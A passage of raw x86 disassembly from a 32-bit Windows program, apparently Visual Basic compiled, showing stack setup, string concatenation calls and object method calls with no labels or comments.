  40562a:	ff 15 38 11 40 00    	call   *0x401138
  405630:	8d 85 90 fe ff ff    	lea    -0x170(%ebp),%eax
  405636:	50                   	push   %eax
  405637:	8d 8d a0 fe ff ff    	lea    -0x160(%ebp),%ecx
  40563d:	51                   	push   %ecx
  40563e:	8d 95 c0 fe ff ff    	lea    -0x140(%ebp),%edx
  405644:	52                   	push   %edx
  405645:	8d 85 b0 fe ff ff    	lea    -0x150(%ebp),%eax
  40564b:	50                   	push   %eax
  40564c:	8d 8d d0 fe ff ff    	lea    -0x130(%ebp),%ecx
  405652:	51                   	push   %ecx
  405653:	8d 95 f0 fe ff ff    	lea    -0x110(%ebp),%edx
  405659:	52                   	push   %edx
  40565a:	8d 85 e0 fe ff ff    	lea    -0x120(%ebp),%eax
  405660:	50                   	push   %eax
  405661:	8d 8d 00 ff ff ff    	lea    -0x100(%ebp),%ecx
  405667:	51                   	push   %ecx
  405668:	8d 95 20 ff ff ff    	lea    -0xe0(%ebp),%edx
  40566e:	52                   	push   %edx
  40566f:	8d 85 10 ff ff ff    	lea    -0xf0(%ebp),%eax
  405675:	50                   	push   %eax
  405676:	8d 8d 30 ff ff ff    	lea    -0xd0(%ebp),%ecx
  40567c:	51                   	push   %ecx
  40567d:	8d 95 40 ff ff ff    	lea    -0xc0(%ebp),%edx
  405683:	52                   	push   %edx
  405684:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
  40568a:	50                   	push   %eax
  40568b:	8d 8d 50 ff ff ff    	lea    -0xb0(%ebp),%ecx
  405691:	51                   	push   %ecx
  405692:	8d 95 70 ff ff ff    	lea    -0x90(%ebp),%edx
  405698:	52                   	push   %edx
  405699:	8d 45 90             	lea    -0x70(%ebp),%eax
  40569c:	50                   	push   %eax
  40569d:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  4056a0:	51                   	push   %ecx
  4056a1:	8d 55 a0             	lea    -0x60(%ebp),%edx
  4056a4:	52                   	push   %edx
  4056a5:	6a 12                	push   $0x12
  4056a7:	ff 15 18 10 40 00    	call   *0x401018
  4056ad:	83 c4 4c             	add    $0x4c,%esp
  4056b0:	c7 45 fc 04 00 00 00 	movl   $0x4,-0x4(%ebp)
  4056b7:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  4056ba:	50                   	push   %eax
  4056bb:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4056be:	8b 11                	mov    (%ecx),%edx
  4056c0:	8b 45 08             	mov    0x8(%ebp),%eax
  4056c3:	50                   	push   %eax
  4056c4:	ff 92 10 07 00 00    	call   *0x710(%edx)
  4056ca:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
  4056cd:	89 8d 64 fe ff ff    	mov    %ecx,-0x19c(%ebp)
  4056d3:	c7 45 b4 00 00 00 00 	movl   $0x0,-0x4c(%ebp)
  4056da:	6a 5a                	push   $0x5a
  4056dc:	8b 55 08             	mov    0x8(%ebp),%edx
  4056df:	8b 42 3c             	mov    0x3c(%edx),%eax
  4056e2:	50                   	push   %eax
  4056e3:	68 f8 31 40 00       	push   $0x4031f8
  4056e8:	ff 15 28 10 40 00    	call   *0x401028
  4056ee:	8b d0                	mov    %eax,%edx
  4056f0:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  4056f3:	ff 15 38 11 40 00    	call   *0x401138
  4056f9:	50                   	push   %eax
  4056fa:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4056fd:	8b 51 38             	mov    0x38(%ecx),%edx
  405700:	52                   	push   %edx
  405701:	ff 15 28 10 40 00    	call   *0x401028
  405707:	8b d0                	mov    %eax,%edx
  405709:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40570c:	ff 15 38 11 40 00    	call   *0x401138
  405712:	50                   	push   %eax
  405713:	68 f0 31 40 00       	push   $0x4031f0
  405718:	ff 15 28 10 40 00    	call   *0x401028
  40571e:	8b d0                	mov    %eax,%edx
  405720:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  405723:	ff 15 38 11 40 00    	call   *0x401138
  405729:	50                   	push   %eax
  40572a:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40572d:	50                   	push   %eax
  40572e:	ff 15 28 10 40 00    	call   *0x401028
  405734:	8b d0                	mov    %eax,%edx
  405736:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  405739:	ff 15 38 11 40 00    	call   *0x401138
  40573f:	50                   	push   %eax
  405740:	68 0c 30 40 00       	push   $0x40300c
  405745:	ff 15 28 10 40 00    	call   *0x401028
  40574b:	8b d0                	mov    %eax,%edx
  40574d:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  405750:	ff 15 38 11 40 00    	call   *0x401138
  405756:	50                   	push   %eax
  405757:	8b 8d 64 fe ff ff    	mov    -0x19c(%ebp),%ecx
  40575d:	51                   	push   %ecx
  40575e:	8d 55 b0             	lea    -0x50(%ebp),%edx
  405761:	52                   	push   %edx
  405762:	ff 15 50 10 40 00    	call   *0x401050
  405768:	50                   	push   %eax
  405769:	8b 45 08             	mov    0x8(%ebp),%eax
  40576c:	8b 08                	mov    (%eax),%ecx
  40576e:	8b 55 08             	mov    0x8(%ebp),%edx
  405771:	52                   	push   %edx
  405772:	ff 91 20 07 00 00    	call   *0x720(%ecx)
  405778:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  40577b:	50                   	push   %eax
  40577c:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  40577f:	51                   	push   %ecx
  405780:	8d 55 cc             	lea    -0x34(%ebp),%edx
  405783:	52                   	push   %edx
  405784:	8d 45 d0             	lea    -0x30(%ebp),%eax
  405787:	50                   	push   %eax
  405788:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40578b:	51                   	push   %ecx
  40578c:	6a 05                	push   $0x5
  40578e:	ff 15 08 11 40 00    	call   *0x401108
  405794:	83 c4 18             	add    $0x18,%esp
  405797:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  40579a:	ff 15 60 11 40 00    	call   *0x401160
  4057a0:	c7 45 fc 05 00 00 00 	movl   $0x5,-0x4(%ebp)
  4057a7:	68 e8 03 00 00       	push   $0x3e8
  4057ac:	e8 6b d6 ff ff       	call   0x402e1c
  4057b1:	ff 15 34 10 40 00    	call   *0x401034
  4057b7:	c7 45 fc 06 00 00 00 	movl   $0x6,-0x4(%ebp)
  4057be:	8b 55 08             	mov    0x8(%ebp),%edx
  4057c1:	8b 42 3c             	mov    0x3c(%edx),%eax
  4057c4:	50                   	push   %eax
  4057c5:	68 f8 31 40 00       	push   $0x4031f8
  4057ca:	ff 15 28 10 40 00    	call   *0x401028
  4057d0:	8b d0                	mov    %eax,%edx
  4057d2:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  4057d5:	ff 15 38 11 40 00    	call   *0x401138
  4057db:	50                   	push   %eax
  4057dc:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4057df:	8b 51 38             	mov    0x38(%ecx),%edx
  4057e2:	52                   	push   %edx
  4057e3:	ff 15 28 10 40 00    	call   *0x401028
  4057e9:	8b d0                	mov    %eax,%edx
  4057eb:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  4057ee:	ff 15 38 11 40 00    	call   *0x401138
  4057f4:	50                   	push   %eax
  4057f5:	68 f0 31 40 00       	push   $0x4031f0
  4057fa:	ff 15 28 10 40 00    	call   *0x401028
  405800:	8b d0                	mov    %eax,%edx
  405802:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  405805:	ff 15 38 11 40 00    	call   *0x401138
  40580b:	50                   	push   %eax
  40580c:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40580f:	50                   	push   %eax
  405810:	ff 15 28 10 40 00    	call   *0x401028
  405816:	8b d0                	mov    %eax,%edx
  405818:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  40581b:	ff 15 38 11 40 00    	call   *0x401138
  405821:	50                   	push   %eax
  405822:	68 0c 30 40 00       	push   $0x40300c
  405827:	ff 15 28 10 40 00    	call   *0x401028
  40582d:	8b d0                	mov    %eax,%edx
  40582f:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  405832:	ff 15 38 11 40 00    	call   *0x401138
  405838:	ba d4 31 40 00       	mov    $0x4031d4,%edx
  40583d:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  405840:	ff 15 00 11 40 00    	call   *0x401100
  405846:	ba 58 26 40 00       	mov    $0x402658,%edx
  40584b:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  40584e:	ff 15 00 11 40 00    	call   *0x401100
  405854:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  405857:	51                   	push   %ecx
  405858:	8d 55 bc             	lea    -0x44(%ebp),%edx
  40585b:	52                   	push   %edx
  40585c:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40585f:	50                   	push   %eax
  405860:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  405863:	51                   	push   %ecx
  405864:	8b 55 08             	mov    0x8(%ebp),%edx
  405867:	8b 02                	mov    (%edx),%eax
  405869:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40586c:	51                   	push   %ecx
  40586d:	ff 90 f8 06 00 00    	call   *0x6f8(%eax)
  405873:	89 85 7c fe ff ff    	mov    %eax,-0x184(%ebp)
  405879:	83 bd 7c fe ff ff 00 	cmpl   $0x0,-0x184(%ebp)
  405880:	7d 23                	jge    0x4058a5
  405882:	68 f8 06 00 00       	push   $0x6f8
  405887:	68 54 27 40 00       	push   $0x402754
  40588c:	8b 55 08             	mov    0x8(%ebp),%edx
  40588f:	52                   	push   %edx
  405890:	8b 85 7c fe ff ff    	mov    -0x184(%ebp),%eax
  405896:	50                   	push   %eax
  405897:	ff 15 38 10 40 00    	call   *0x401038
  40589d:	89 85 5c fe ff ff    	mov    %eax,-0x1a4(%ebp)
  4058a3:	eb 0a                	jmp    0x4058af
  4058a5:	c7 85 5c fe ff ff 00 	movl   $0x0,-0x1a4(%ebp)
  4058ac:	00 00 00 
  4058af:	8b 4d b8             	mov    -0x48(%ebp),%ecx
  4058b2:	89 8d 60 fe ff ff    	mov    %ecx,-0x1a0(%ebp)
  4058b8:	c7 45 b8 00 00 00 00 	movl   $0x0,-0x48(%ebp)
  4058bf:	8b 95 60 fe ff ff    	mov    -0x1a0(%ebp),%edx
  4058c5:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4058c8:	ff 15 38 11 40 00    	call   *0x401138
  4058ce:	8d 55 bc             	lea    -0x44(%ebp),%edx
  4058d1:	52                   	push   %edx
  4058d2:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4058d5:	50                   	push   %eax
  4058d6:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  4058d9:	51                   	push   %ecx
  4058da:	8d 55 c8             	lea    -0x38(%ebp),%edx
  4058dd:	52                   	push   %edx
  4058de:	8d 45 cc             	lea    -0x34(%ebp),%eax
  4058e1:	50                   	push   %eax
  4058e2:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  4058e5:	51                   	push   %ecx
  4058e6:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  4058e9:	52                   	push   %edx
  4058ea:	6a 07                	push   $0x7
  4058ec:	ff 15 08 11 40 00    	call   *0x401108
  4058f2:	83 c4 20             	add    $0x20,%esp
  4058f5:	c7 45 fc 07 00 00 00 	movl   $0x7,-0x4(%ebp)
  4058fc:	8b 45 08             	mov    0x8(%ebp),%eax
  4058ff:	8b 48 3c             	mov    0x3c(%eax),%ecx
  405902:	51                   	push   %ecx
  405903:	68 f8 31 40 00       	push   $0x4031f8
  405908:	ff 15 28 10 40 00    	call   *0x401028
  40590e:	8b d0                	mov    %eax,%edx
  405910:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  405913:	ff 15 38 11 40 00    	call   *0x401138
  405919:	50                   	push   %eax
  40591a:	8b 55 08             	mov    0x8(%ebp),%edx
  40591d:	8b 42 38             	mov    0x38(%edx),%eax
  405920:	50                   	push   %eax
  405921:	ff 15 28 10 40 00    	call   *0x401028
  405927:	8b d0                	mov    %eax,%edx
  405929:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40592c:	ff 15 38 11 40 00    	call   *0x401138
  405932:	50                   	push   %eax
  405933:	68 f0 31 40 00       	push   $0x4031f0
  405938:	ff 15 28 10 40 00    	call   *0x401028
  40593e:	8b d0                	mov    %eax,%edx
  405940:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  405943:	ff 15 38 11 40 00    	call   *0x401138
  405949:	50                   	push   %eax
  40594a:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40594d:	51                   	push   %ecx
  40594e:	ff 15 28 10 40 00    	call   *0x401028
  405954:	8b d0                	mov    %eax,%edx
  405956:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  405959:	ff 15 38 11 40 00    	call   *0x401138
  40595f:	50                   	push   %eax
  405960:	68 0c 30 40 00       	push   $0x40300c
  405965:	ff 15 28 10 40 00    	call   *0x401028
  40596b:	89 45 a8             	mov    %eax,-0x58(%ebp)
  40596e:	c7 45 a0 08 00 00 00 	movl   $0x8,-0x60(%ebp)
  405975:	8d 55 a0             	lea    -0x60(%ebp),%edx
  405978:	52                   	push   %edx
  405979:	ff 15 88 10 40 00    	call   *0x401088
  40597f:	8d 45 c8             	lea    -0x38(%ebp),%eax
  405982:	50                   	push   %eax
  405983:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  405986:	51                   	push   %ecx
  405987:	8d 55 d0             	lea    -0x30(%ebp),%edx
  40598a:	52                   	push   %edx
  40598b:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40598e:	50                   	push   %eax
  40598f:	6a 04                	push   $0x4
  405991:	ff 15 08 11 40 00    	call   *0x401108
  405997:	83 c4 14             	add    $0x14,%esp
  40599a:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  40599d:	ff 15 0c 10 40 00    	call   *0x40100c
  4059a3:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  4059aa:	68 86 5a 40 00       	push   $0x405a86
  4059af:	e9 bf 00 00 00       	jmp    0x405a73
  4059b4:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  4059b7:	51                   	push   %ecx
  4059b8:	8d 55 bc             	lea    -0x44(%ebp),%edx
  4059bb:	52                   	push   %edx
  4059bc:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4059bf:	50                   	push   %eax
  4059c0:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  4059c3:	51                   	push   %ecx
  4059c4:	8d 55 c8             	lea    -0x38(%ebp),%edx
  4059c7:	52                   	push   %edx
  4059c8:	8d 45 cc             	lea    -0x34(%ebp),%eax
  4059cb:	50                   	push   %eax
  4059cc:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  4059cf:	51                   	push   %ecx
  4059d0:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  4059d3:	52                   	push   %edx
  4059d4:	6a 08                	push   $0x8
  4059d6:	ff 15 08 11 40 00    	call   *0x401108
  4059dc:	83 c4 24             	add    $0x24,%esp
  4059df:	8d 45 b0             	lea    -0x50(%ebp),%eax
  4059e2:	50                   	push   %eax
  4059e3:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  4059e6:	51                   	push   %ecx
  4059e7:	6a 02                	push   $0x2
  4059e9:	ff 15 20 10 40 00    	call   *0x401020
  4059ef:	83 c4 0c             	add    $0xc,%esp
  4059f2:	8d 95 90 fe ff ff    	lea    -0x170(%ebp),%edx
  4059f8:	52                   	push   %edx
  4059f9:	8d 85 a0 fe ff ff    	lea    -0x160(%ebp),%eax
  4059ff:	50                   	push   %eax
  405a00:	8d 8d b0 fe ff ff    	lea    -0x150(%ebp),%ecx
  405a06:	51                   	push   %ecx
  405a07:	8d 95 c0 fe ff ff    	lea    -0x140(%ebp),%edx
  405a0d:	52                   	push   %edx
  405a0e:	8d 85 d0 fe ff ff    	lea    -0x130(%ebp),%eax
  405a14:	50                   	push   %eax
  405a15:	8d 8d e0 fe ff ff    	lea    -0x120(%ebp),%ecx
  405a1b:	51                   	push   %ecx
  405a1c:	8d 95 f0 fe ff ff    	lea    -0x110(%ebp),%edx
  405a22:	52                   	push   %edx
  405a23:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
  405a29:	50                   	push   %eax
  405a2a:	8d 8d 10 ff ff ff    	lea    -0xf0(%ebp),%ecx
  405a30:	51                   	push   %ecx
  405a31:	8d 95 20 ff ff ff    	lea    -0xe0(%ebp),%edx
  405a37:	52                   	push   %edx
  405a38:	8d 85 30 ff ff ff    	lea    -0xd0(%ebp),%eax
  405a3e:	50                   	push   %eax
  405a3f:	8d 8d 40 ff ff ff    	lea    -0xc0(%ebp),%ecx
  405a45:	51                   	push   %ecx
  405a46:	8d 95 50 ff ff ff    	lea    -0xb0(%ebp),%edx
  405a4c:	52                   	push   %edx
  405a4d:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
  405a53:	50                   	push   %eax
  405a54:	8d 8d 70 ff ff ff    	lea    -0x90(%ebp),%ecx
  405a5a:	51                   	push   %ecx
  405a5b:	8d 55 80             	lea    -0x80(%ebp),%edx
  405a5e:	52                   	push   %edx
  405a5f:	8d 45 90             	lea    -0x70(%ebp),%eax
  405a62:	50                   	push   %eax
  405a63:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  405a66:	51                   	push   %ecx
  405a67:	6a 12                	push   $0x12
  405a69:	ff 15 18 10 40 00    	call   *0x401018
  405a6f:	83 c4 4c             	add    $0x4c,%esp
  405a72:	c3                   	ret
  405a73:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  405a76:	ff 15 64 11 40 00    	call   *0x401164
  405a7c:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  405a7f:	ff 15 64 11 40 00    	call   *0x401164
  405a85:	c3                   	ret
  405a86:	8b 55 08             	mov    0x8(%ebp),%edx
  405a89:	8b 02                	mov    (%edx),%eax
  405a8b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405a8e:	51                   	push   %ecx
  405a8f:	ff 50 08             	call   *0x8(%eax)
  405a92:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405a95:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  405a98:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  405a9f:	5f                   	pop    %edi
  405aa0:	5e                   	pop    %esi
  405aa1:	5b                   	pop    %ebx
  405aa2:	8b e5                	mov    %ebp,%esp
  405aa4:	5d                   	pop    %ebp
  405aa5:	c2 04 00             	ret    $0x4
  405aa8:	cc                   	int3
  405aa9:	cc                   	int3
  405aaa:	cc                   	int3
  405aab:	cc                   	int3
  405aac:	cc                   	int3
  405aad:	cc                   	int3
  405aae:	cc                   	int3
  405aaf:	cc                   	int3
  405ab0:	55                   	push   %ebp
  405ab1:	8b ec                	mov    %esp,%ebp
  405ab3:	83 ec 18             	sub    $0x18,%esp
  405ab6:	68 a6 14 40 00       	push   $0x4014a6
  405abb:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  405ac1:	50                   	push   %eax
  405ac2:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  405ac9:	b8 68 00 00 00       	mov    $0x68,%eax
  405ace:	e8 cd b9 ff ff       	call   0x4014a0
  405ad3:	53                   	push   %ebx
  405ad4:	56                   	push   %esi
  405ad5:	57                   	push   %edi
  405ad6:	89 65 e8             	mov    %esp,-0x18(%ebp)
  405ad9:	c7 45 ec 58 13 40 00 	movl   $0x401358,-0x14(%ebp)
  405ae0:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  405ae7:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  405aee:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  405af5:	8b 45 0c             	mov    0xc(%ebp),%eax
  405af8:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  405afe:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  405b05:	6a ff                	push   $0xffffffff
  405b07:	ff 15 4c 10 40 00    	call   *0x40104c
  405b0d:	c7 45 fc 03 00 00 00 	movl   $0x3,-0x4(%ebp)
  405b14:	83 3d b8 a3 40 00 00 	cmpl   $0x0,0x40a3b8
  405b1b:	75 19                	jne    0x405b36
  405b1d:	68 b8 a3 40 00       	push   $0x40a3b8
  405b22:	68 ac 2e 40 00       	push   $0x402eac
  405b27:	ff 15 e8 10 40 00    	call   *0x4010e8
  405b2d:	c7 45 98 b8 a3 40 00 	movl   $0x40a3b8,-0x68(%ebp)
  405b34:	eb 07                	jmp    0x405b3d
  405b36:	c7 45 98 b8 a3 40 00 	movl   $0x40a3b8,-0x68(%ebp)
  405b3d:	8b 4d 98             	mov    -0x68(%ebp),%ecx
  405b40:	8b 11                	mov    (%ecx),%edx
  405b42:	89 55 bc             	mov    %edx,-0x44(%ebp)
  405b45:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  405b48:	50                   	push   %eax
  405b49:	8b 4d bc             	mov    -0x44(%ebp),%ecx
  405b4c:	8b 11                	mov    (%ecx),%edx
  405b4e:	8b 45 bc             	mov    -0x44(%ebp),%eax
  405b51:	50                   	push   %eax
  405b52:	ff 52 1c             	call   *0x1c(%edx)
  405b55:	db e2                	fnclex
  405b57:	89 45 b8             	mov    %eax,-0x48(%ebp)
  405b5a:	83 7d b8 00          	cmpl   $0x0,-0x48(%ebp)
  405b5e:	7d 1a                	jge    0x405b7a
  405b60:	6a 1c                	push   $0x1c
  405b62:	68 9c 2e 40 00       	push   $0x402e9c
  405b67:	8b 4d bc             	mov    -0x44(%ebp),%ecx
  405b6a:	51                   	push   %ecx
  405b6b:	8b 55 b8             	mov    -0x48(%ebp),%edx
  405b6e:	52                   	push   %edx
  405b6f:	ff 15 38 10 40 00    	call   *0x401038
  405b75:	89 45 94             	mov    %eax,-0x6c(%ebp)
  405b78:	eb 07                	jmp    0x405b81
  405b7a:	c7 45 94 00 00 00 00 	movl   $0x0,-0x6c(%ebp)
  405b81:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  405b84:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  405b87:	c7 45 c8 02 00 00 00 	movl   $0x2,-0x38(%ebp)
  405b8e:	c7 45 c0 03 00 00 00 	movl   $0x3,-0x40(%ebp)
  405b95:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  405b98:	51                   	push   %ecx
  405b99:	b8 10 00 00 00       	mov    $0x10,%eax
  405b9e:	e8 fd b8 ff ff       	call   0x4014a0
  405ba3:	8b d4                	mov    %esp,%edx
  405ba5:	8b 45 c0             	mov    -0x40(%ebp),%eax
  405ba8:	89 02                	mov    %eax,(%edx)
  405baa:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  405bad:	89 4a 04             	mov    %ecx,0x4(%edx)
  405bb0:	8b 45 c8             	mov    -0x38(%ebp),%eax
  405bb3:	89 42 08             	mov    %eax,0x8(%edx)
  405bb6:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  405bb9:	89 4a 0c             	mov    %ecx,0xc(%edx)
  405bbc:	8b 55 b4             	mov    -0x4c(%ebp),%edx
  405bbf:	8b 02                	mov    (%edx),%eax
  405bc1:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
  405bc4:	51                   	push   %ecx
  405bc5:	ff 50 54             	call   *0x54(%eax)
  405bc8:	db e2                	fnclex
  405bca:	89 45 b0             	mov    %eax,-0x50(%ebp)
  405bcd:	83 7d b0 00          	cmpl   $0x0,-0x50(%ebp)
  405bd1:	7d 1a                	jge    0x405bed
  405bd3:	6a 54                	push   $0x54
  405bd5:	68 18 30 40 00       	push   $0x403018
  405bda:	8b 55 b4             	mov    -0x4c(%ebp),%edx
  405bdd:	52                   	push   %edx
  405bde:	8b 45 b0             	mov    -0x50(%ebp),%eax
  405be1:	50                   	push   %eax
  405be2:	ff 15 38 10 40 00    	call   *0x401038
  405be8:	89 45 90             	mov    %eax,-0x70(%ebp)
  405beb:	eb 07                	jmp    0x405bf4
  405bed:	c7 45 90 00 00 00 00 	movl   $0x0,-0x70(%ebp)
  405bf4:	68 28 30 40 00       	push   $0x403028
  405bf9:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  405bfc:	51                   	push   %ecx
  405bfd:	ff 15 3c 11 40 00    	call   *0x40113c
  405c03:	50                   	push   %eax
  405c04:	8d 55 dc             	lea    -0x24(%ebp),%edx
  405c07:	52                   	push   %edx
  405c08:	ff 15 50 10 40 00    	call   *0x401050
  405c0e:	8d 45 d0             	lea    -0x30(%ebp),%eax
  405c11:	50                   	push   %eax
  405c12:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  405c15:	51                   	push   %ecx
  405c16:	6a 02                	push   $0x2
  405c18:	ff 15 20 10 40 00    	call   *0x401020
  405c1e:	83 c4 0c             	add    $0xc,%esp
  405c21:	c7 45 fc 04 00 00 00 	movl   $0x4,-0x4(%ebp)
  405c28:	6a 00                	push   $0x0
  405c2a:	6a 00                	push   $0x0
  405c2c:	33 c9                	xor    %ecx,%ecx
  405c2e:	ff 15 a8 10 40 00    	call   *0x4010a8
  405c34:	50                   	push   %eax
  405c35:	b9 2c 00 00 00       	mov    $0x2c,%ecx
  405c3a:	ff 15 a8 10 40 00    	call   *0x4010a8
  405c40:	50                   	push   %eax
  405c41:	e8 2a d2 ff ff       	call   0x402e70
  405c46:	ff 15 34 10 40 00    	call   *0x401034
  405c4c:	c7 45 fc 05 00 00 00 	movl   $0x5,-0x4(%ebp)
  405c53:	ff 15 60 10 40 00    	call   *0x401060
  405c59:	c7 45 fc 06 00 00 00 	movl   $0x6,-0x4(%ebp)
  405c60:	6a 00                	push   $0x0
  405c62:	6a 00                	push   $0x0
  405c64:	33 c9                	xor    %ecx,%ecx
  405c66:	ff 15 a8 10 40 00    	call   *0x4010a8
  405c6c:	50                   	push   %eax
  405c6d:	b9 2c 00 00 00       	mov    $0x2c,%ecx
  405c72:	ff 15 a8 10 40 00    	call   *0x4010a8
  405c78:	50                   	push   %eax
  405c79:	e8 f2 d1 ff ff       	call   0x402e70
  405c7e:	ff 15 34 10 40 00    	call   *0x401034
  405c84:	c7 45 fc 07 00 00 00 	movl   $0x7,-0x4(%ebp)
  405c8b:	ff 15 60 10 40 00    	call   *0x401060
  405c91:	c7 45 fc 08 00 00 00 	movl   $0x8,-0x4(%ebp)
  405c98:	6a 00                	push   $0x0
  405c9a:	6a 00                	push   $0x0
  405c9c:	33 c9                	xor    %ecx,%ecx
  405c9e:	ff 15 a8 10 40 00    	call   *0x4010a8
  405ca4:	50                   	push   %eax
  405ca5:	b9 2c 00 00 00       	mov    $0x2c,%ecx
  405caa:	ff 15 a8 10 40 00    	call   *0x4010a8
  405cb0:	50                   	push   %eax
  405cb1:	e8 ba d1 ff ff       	call   0x402e70
  405cb6:	ff 15 34 10 40 00    	call   *0x401034
  405cbc:	c7 45 fc 09 00 00 00 	movl   $0x9,-0x4(%ebp)
  405cc3:	ff 15 60 10 40 00    	call   *0x401060
  405cc9:	c7 45 fc 0a 00 00 00 	movl   $0xa,-0x4(%ebp)
  405cd0:	83 3d b8 a3 40 00 00 	cmpl   $0x0,0x40a3b8
  405cd7:	75 19                	jne    0x405cf2
  405cd9:	68 b8 a3 40 00       	push   $0x40a3b8
  405cde:	68 ac 2e 40 00       	push   $0x402eac
  405ce3:	ff 15 e8 10 40 00    	call   *0x4010e8
  405ce9:	c7 45 8c b8 a3 40 00 	movl   $0x40a3b8,-0x74(%ebp)
  405cf0:	eb 07                	jmp    0x405cf9
  405cf2:	c7 45 8c b8 a3 40 00 	movl   $0x40a3b8,-0x74(%ebp)
  405cf9:	8b 55 8c             	mov    -0x74(%ebp),%edx
  405cfc:	8b 02                	mov    (%edx),%eax
  405cfe:	89 45 bc             	mov    %eax,-0x44(%ebp)
  405d01:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  405d04:	51                   	push   %ecx
  405d05:	8b 55 bc             	mov    -0x44(%ebp),%edx
  405d08:	8b 02                	mov    (%edx),%eax
  405d0a:	8b 4d bc             	mov    -0x44(%ebp),%ecx
  405d0d:	51                   	push   %ecx
  405d0e:	ff 50 1c             	call   *0x1c(%eax)
  405d11:	db e2                	fnclex
  405d13:	89 45 b8             	mov    %eax,-0x48(%ebp)
  405d16:	83 7d b8 00          	cmpl   $0x0,-0x48(%ebp)
  405d1a:	7d 1a                	jge    0x405d36
  405d1c:	6a 1c                	push   $0x1c
  405d1e:	68 9c 2e 40 00       	push   $0x402e9c
  405d23:	8b 55 bc             	mov    -0x44(%ebp),%edx
  405d26:	52                   	push   %edx
  405d27:	8b 45 b8             	mov    -0x48(%ebp),%eax
  405d2a:	50                   	push   %eax
  405d2b:	ff 15 38 10 40 00    	call   *0x401038
  405d31:	89 45 88             	mov    %eax,-0x78(%ebp)
  405d34:	eb 07                	jmp    0x405d3d
  405d36:	c7 45 88 00 00 00 00 	movl   $0x0,-0x78(%ebp)
  405d3d:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  405d40:	89 4d b4             	mov    %ecx,-0x4c(%ebp)
  405d43:	c7 45 c8 02 00 00 00 	movl   $0x2,-0x38(%ebp)
  405d4a:	c7 45 c0 03 00 00 00 	movl   $0x3,-0x40(%ebp)
  405d51:	8d 55 d0             	lea    -0x30(%ebp),%edx
  405d54:	52                   	push   %edx
  405d55:	b8 10 00 00 00       	mov    $0x10,%eax
  405d5a:	e8 41 b7 ff ff       	call   0x4014a0
  405d5f:	8b c4                	mov    %esp,%eax
  405d61:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  405d64:	89 08                	mov    %ecx,(%eax)
  405d66:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  405d69:	89 50 04             	mov    %edx,0x4(%eax)
